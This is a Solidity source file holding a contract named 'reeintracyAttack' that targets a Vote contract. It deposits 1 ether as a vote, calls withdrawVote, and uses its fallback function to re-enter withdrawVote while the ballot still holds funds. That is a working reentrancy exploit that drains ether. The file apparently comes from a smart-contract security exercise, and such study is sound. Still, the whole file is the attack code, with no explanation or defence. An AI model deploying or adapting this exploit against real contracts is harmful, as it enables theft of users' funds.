import "contracts/vote.sol";

contract reeintracyAttack {
    Vote public ballot;

    constructor(address _ballotAddress) {
        ballot = Vote(_ballotAddress);
    }

    // fallback is called when receive is not defined
    fallback() external payable {
        if (address(ballot).balance >= 1 ether) {
            ballot.withdrawVote();
        }
    }

    // takes candidate to attack as parameter
    function attack(uint candidate) external payable {
        require(msg.value >= 1 ether);
        ballot.vote{value: 1 ether}(candidate);
        ballot.withdrawVote();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
